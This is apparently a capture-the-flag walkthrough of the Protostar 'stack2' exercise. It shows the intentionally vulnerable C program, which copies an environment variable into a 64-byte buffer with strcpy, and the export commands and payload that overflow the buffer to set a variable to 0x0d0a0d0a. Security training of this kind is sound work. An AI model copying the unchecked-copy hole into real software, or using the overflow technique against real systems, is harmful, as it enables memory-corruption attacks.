# Stack2
## Briefing
Stack2 looks at environment variables, and how they can be set.

This level is at /opt/protostar/bin/stack2
## Source Code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
## Solution
Ok, so just looking at this program we can see that the only way of getting input in is through the greenie environment variable.
The `strcpy(buffer, variable);` call is copying whatever is in the environment varible into the buffer, and if the buffer only has 64 bytes of memory then we can perform an attack similar to stack1, we just need a way of setting this environment variable.

Luckily the export command can help us do this.
`export GREENIE=$(python -c "print('A')")`

And then run the program, `./stack2`

`Try again, you got 0x00000000`

Ok, so we now can set the variable, great.
Now lets overwrite the variable again and see what happens

`export GREENIE=$(python -c "print('A' * 68)")`
`./stack2`

`Try again, you got 0x41414141`

Nice! now we can simply overwrite the variable, just like stack2, make sure to remember endianness!

`export GREENIE=$(python -c "print('A' * 64 + '\x0a\x0d\x0a\x0d')")`
`./stack2`

`you have correctly modified the variable`

Complete! That was an interesing one!
